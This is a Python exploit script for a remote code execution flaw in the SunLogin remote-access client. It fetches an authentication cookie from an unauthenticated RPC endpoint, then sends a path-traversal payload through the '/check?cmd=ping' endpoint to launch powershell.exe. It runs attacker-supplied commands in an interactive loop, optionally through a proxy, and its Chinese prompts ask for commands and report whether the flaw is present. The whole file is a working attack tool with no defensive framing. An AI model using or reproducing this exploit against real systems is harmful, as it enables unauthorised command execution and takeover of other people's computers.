# -*- coding: UTF-8 -*- 
import requests
import json
import argparse
requests.packages.urllib3.disable_warnings()


def get_cookie(ip_port, proxies):
    url = "http://{ip_port}/cgi-bin/rpc?action=verify-haras".format(ip_port=ip_port)
    # 192.168.2.58:54381
    payload = ""
    headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "User-Agent": "SLRC/11.0.0.33162 (Windows,x64)Chrome/98.0.4758.82 Safari/537.36",
        "Host": "{ip_port}".format(ip_port=ip_port),
        "Accept-Encoding": "gzip, deflate",
        "Upgrade-Insecure-Requests": "1",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Proxy-Connection": "keep-alive"
    }
    response = requests.request("GET", url, data=payload, headers=headers, verify=False, proxies=proxies)
    # print(response)
    # print(response.status_code)
    print("response: {}".format(response.text))
    cookie = None
    try:
        json_str = json.loads(response.text)
        # print("json_str", json_str)
        cookie = json_str["verify_string"]
        # print("cookie", cookie)
    except Exception as e:
        print(str(e))
    return cookie


def run_cmd(ip_port, cookie, cmd, proxies):
    url = f"http://{ip_port}/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+{cmd}".format(
        ip_port=ip_port, cmd=cmd)
    payload = ""
    headers = {
        "Cookie": "CID={cookie};".format(cookie=cookie),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "User-Agent": "SLRC/11.0.0.33162 (Windows,x64)Chrome/98.0.4758.82 Safari/537.36",
        "Host": "{ip_port}".format(ip_port=ip_port),
        "Accept-Encoding": "gzip, deflate",
        "Upgrade-Insecure-Requests": "1",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Proxy-Connection": "keep-alive"
    }
    response = requests.request("GET", url, data=payload, headers=headers, verify=False, proxies=proxies)
    # print(response.status_code)
    # print(response)
    # print(response.content)
    response.encoding = 'gb2312'
    print(response.text)


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.description = "Sun Login RCE CMD ..."
    parser.add_argument("-i", "--host", help="Specifies a ip:port", default="192.168.2.58:54381")
    parser.add_argument("-p", "--proxies", help="Specify the requests proxy address, support Socks5 and HTTP, for example: http://127.0.0.1:8080 or socks5://127.0.0.1:1080", default=None)
    args = parser.parse_args()

    if args.proxies !=None: args.proxies={ 'http': args.proxies.replace('https://','http://') , 'https': args.proxies.replace('http://','https://')  }


    ip_port = args.host
    #cmd = args.cmd
    cookie = get_cookie(ip_port,args.proxies)
    print("cookie: {}".format(cookie))
    if cookie is not None:
        while True:
            cmd = input("输入需要执行的命令(按q退出):")
            if cmd == 'q':
                break
            else:
                run_cmd(ip_port, cookie, cmd,args.proxies)
    else:
        print("SunLogin Cookie获取失败!!! 漏洞不存在...")
